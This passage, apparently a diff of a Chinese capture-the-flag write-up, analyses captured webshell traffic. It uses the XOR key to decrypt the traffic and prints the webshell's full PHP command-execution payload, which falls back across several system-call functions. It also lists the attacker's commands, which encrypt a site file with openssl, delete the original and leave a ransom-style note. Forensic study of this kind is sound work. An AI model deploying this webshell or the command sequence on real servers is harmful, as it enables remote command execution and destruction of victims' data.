VkpcBU1GVkgZFl41L2McXj44GUZFQhVEGRIRCTJ+YkUOElMJDAwdB1FAHVNVHRlFF1luLDJLFUoZUV0QTQUFTAg/M0ZFQhUZGVdZEQAUXAMTGh0sEAdkIHt6HUUATFAGFBsZBwsGFUUZFncUBlEdQkNdSQMLRRlEHWJUBhF+W0waEkJrb0IVRBkSFUJFEFMVEw8ZFgoSUAoRFlZORRNHQhoJNGxFQhVEGRIVQkFfYi9kEgRGKzd5KAI/P0JFFBVFExIZDwNCHQ1KbUcHFltAF1BXEUIDEhxNGUk4aEUUFUUTEhlGRUIVRE5aXA4AFB1EE1RcCQNKEQJJGxxCHjk/RRMSGUZFQhVEGRIVQkUUFUFYZXMxRUwIRF9AUAMBHBEDQx4ZV1VQAU0CPz9CRRQVRRMSGUZFQhUZNDgVQkUUFUUTEkRrb0IVRBkSFUJFdEUGX11KA01GUxQQCThoRRQVRU4SXAoWBxUfNDgVQkUUFUUTEh0NMihiRAQSBVloPhVFExIZRkVCERZcQUAOEW8XFkdTTRMWQGhEBBJXAxZRA1FsV1cFCgZQTBtUVAsJFhxePjgZRkVCFUQZEhEQAEdACUdpGwsWBRc5GQ8VAARHUFMHbVwIBg1RAREQWw0LURUKVRJJFAoBagtJV1tNFVVGFkdaSxNKEV0BVV5qBx1RVkpWSlwFSgdNAVoSXBFFVUMEWl5YBAkHF00CPz9CRRQVRRMSGUIOB0xEBBIRPTZxZjZ6fXc9QgkSOQI/P0JFFBVFExIZAwYKWkRcXFYQHERBTVlBVgg6B1sHVlZQSkFGUBZGXk1PTFk4bhkSFUJFFBVFQVdNExcMDmkzEhVCRRQVRRM/M0ZFQhUZNDgVQkUUERdWQUwKETkXF01TQRcWFmhFDhJbBxYHA1BmV1sBClBQTRFBTAUGB0YXGxsOb28UFUUTFksDFhdZEGIQWBECFmhFDhJbBxYHA1BmV1sBClBQTVRXTTUEBFA3TUAdRg5jfzIaGwJrb0IVRBlXVgoKFFALUEBAFhFKXxdWXGoHC1daAVYaHRQAEUAITRscWWg+SGg5PzNsAxdbB01bWgxFcVsGQUtJEk1GUQVNUxxoHj4VRRMSHQ0AGwhGXAYAB1YGDANWUAwCXFAABhsJFWhsUloXGxZQW1VZEQ0FQUEQCVFbTRdWWBIESw5AUBkeS0VPP0UTEhlvQQZUEFhpEQs4FAhFF1ZYEgQ5EQ1kbBEJAE1uQVoZCEBUV2hfGTgVQkUUSG8TEhlGQQBGWRtQVBEAAgE6ERwbAwsBWgBcEA5obBBUA0dXS1tBAEZMHVZUFgQaF0caCTNGRUIVFlxGQBALFBEEVUZcFF5oSG4dUVgGWBZsV2JVdVQ0BXwPaARtJyN2ZDB9Z2sKHTpnMXNRViUNQ2BWYQNjLgkEew5rUVYlDUNWVmEDYy4JBFYsc0RtJAFsY1RLA1ohHRRsM2tRfAs/X1Q9eg8bXUEBWAAEUFQRAAIBOldXWgkBBx1AWl9RS14QRQRHWgRENyZaEmhncyA0BWcifwNdIDQLDBNYenc2AXxjDlZkAVQrIQwTWHp3GAF8Yw5WZAARBg8NEm8DUTopB2MSUXUADj8hDVkbCRESBEBdWFFTSgNTVmoAXFFaBgAcERVSRlFPXm8/CVhbW0pBV1gBHxZJBxEKHF8=&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>运行结果即执行的命令：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== <span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$kWJW</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x1cGxvYWRcIiZkaXI=&quot;</span>;<span class="variable">$cmd</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3VwbG9hZC8=&quot;</span>;<span class="variable">$path</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
-<p>可以看到主要的操作是先将<code>$cmd</code>和<code>$path</code>进行<code>base64_decode</code>，之后执行并返回
-先<code>json_encode</code>后<code>Encrypt</code>的<code>$result</code>，<code>$result</code>中有两个信息，<code>base64_encode</code>后的<code>status</code>和<code>msg</code>，其中<code>msg</code>是执行系统命令后的回显结果。于是可以先分析出第三段进行的操作：</p>
+
+<p>可以看到主要的操作是先将<code>$cmd</code>和<code>$path</code>进行<code>base64_decode</code>，之后执行并返回 先<code>json_encode</code>后<code>Encrypt</code>的<code>$result</code>，<code>$result</code>中有两个信息，<code>base64_encode</code>后的<code>status</code>和<code>msg</code>，其中<code>msg</code>是执行系统命令后的回显结果。于是可以先分析出第三段进行的操作：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br></pre></td></tr></table></figure>
+
 <p>结合流量的响应包可以分析出上述操作后的结果：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd9eghDQVwxLhN6M2NDdiAgfXo2B0BcAwQKejN3Rh4DPEZMIV5eSyIJC0QgVVhXASt3XCFfWFsACw9aMFVHWj5KWFwvVV5TUQMPWC8BVXs2PEx6NgMCdDMsVnE1Vnx2CydxeglLcGgzIyZjIWNRY1Izd20tcV1aICtSUTNrB20YPARtLXFdWi4rUlEzawdtUSdNV1RLam9XAQFRPHtBV1AjX3wqVlNRKQAARxFuC1kzVX9xNFxLdCIsUnkeeAd5GCAHfCZyS3QyChp4J3hVfCEkDGcgX2FpDyQFfCd4VXwhJFN8JnJHfTcKG3ggcAJ5GCQBeR92AXAlJBt4MFZFeiEkU3wmcgprIwkxZQ14VXwhJFN8JnJVcCUkF3kDCXl4CCRNeyYLRXY1XRp7HXhVeAggAngxclVwJSQFfCd4VXwhJFN8JnJVcCUkGHggWlVWUA1YVyJER1ohDRVxNVZVfCEkU3wmclVwJSQFfCd4VXwhJEx8KmAGSBMENV1PagVBCyRTfCZyVXAlJAV8J3hVfCYoQ3scd15LPAMNXAtwfHYLJFN8JnJVcCUkBXwneFV8ISRTfCF6VQwqDBMAUUxHAABXYnwhegJ3HxIbex5SQXsIDk55IVRLdyUhDl9SZR1bDi5eWRdpVFYPCit7J14PCEAY&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure>
+
 <p>运行结果：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;IOmpseWKqOWZqCBEIOS4reeahOWNt+aYryDmlrDliqDljbcNCiDljbfnmoTluo\/liJflj7fmmK8gNTYxOS00MUI4DQoNCiBEOlxBQUFDVEZcV0VCXHBocFN0dWR5XzY0XHBocHN0dWR5X3Byb1xXV1dcdXBsb2FkIOeahOebruW9lQ0KDQoyMDI0LzA5LzE3ICAyMToxMCAgICA8RElSPiAgICAgICAgICAuDQoyMDI0LzA5LzE3ICAyMTowOCAgICA8RElSPiAgICAgICAgICAuLg0KMjAyNC8wOS8xNyAgMjE6MTAgICAgICAgICAgICAgICAzMDcgc2hlbGwucGhwDQogICAgICAgICAgICAgICAxIOS4quaWh+S7tiAgICAgICAgICAgIDMwNyDlrZfoioINCiAgICAgICAgICAgICAgIDIg5Liq55uu5b2VIDI0NywyNzksNjkzLDgyNCDlj6\/nlKjlrZfoioINCg==&quot;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>进行base64解码可以得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status:success</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msg:</span><br><span class="line"> 驱动器 D 中的卷是 新加卷</span><br><span class="line"> 卷的序列号是 5619-41B8</span><br><span class="line"></span><br><span class="line"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span><br><span class="line"></span><br><span class="line">2024/09/17  21:10    &lt;DIR&gt;          .</span><br><span class="line">2024/09/17  21:08    &lt;DIR&gt;          ..</span><br><span class="line">2024/09/17  21:10               307 shell.php</span><br><span class="line">               1 个文件            307 字节</span><br><span class="line">               2 个目录 247,279,693,824 可用字节</span><br></pre></td></tr></table></figure>
+
 <p>之后一段段分析即可，整段攻击过程如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/17  21:10               307 shell.php</span></span><br><span class="line"><span class="string">               1 个文件            307 字节</span></span><br><span class="line"><span class="string">               2 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;<span class="built_in">cd</span> ../</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/07  18:30    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/16  23:22               332 index.html</span></span><br><span class="line"><span class="string">2024/09/17  20:21                75 unfinished_hello.php</span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          upload</span></span><br><span class="line"><span class="string">2024/09/17  11:07             1,202 upload.php</span></span><br><span class="line"><span class="string">               3 个文件          1,609 字节</span></span><br><span class="line"><span class="string">               3 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl version</span><br><span class="line"></span><br><span class="line">WARNING: can<span class="string">&#x27;t open config file: /usr/local/ssl/openssl.cnf</span></span><br><span class="line"><span class="string">OpenSSL 1.0.2p  14 Aug 2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl enc -aes-128-cbc -in unfinished_hello.php -out secret.php -iv 114514 -K c4d038b4bed09fdb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: can&#x27;</span>t open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;del unfinished_hello.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;<span class="built_in">echo</span> <span class="string">&quot;If you want to decrypt your file, give me a copy of your calculus homework. UwU&quot;</span> &gt; readme.txt</span><br></pre></td></tr></table></figure>
+
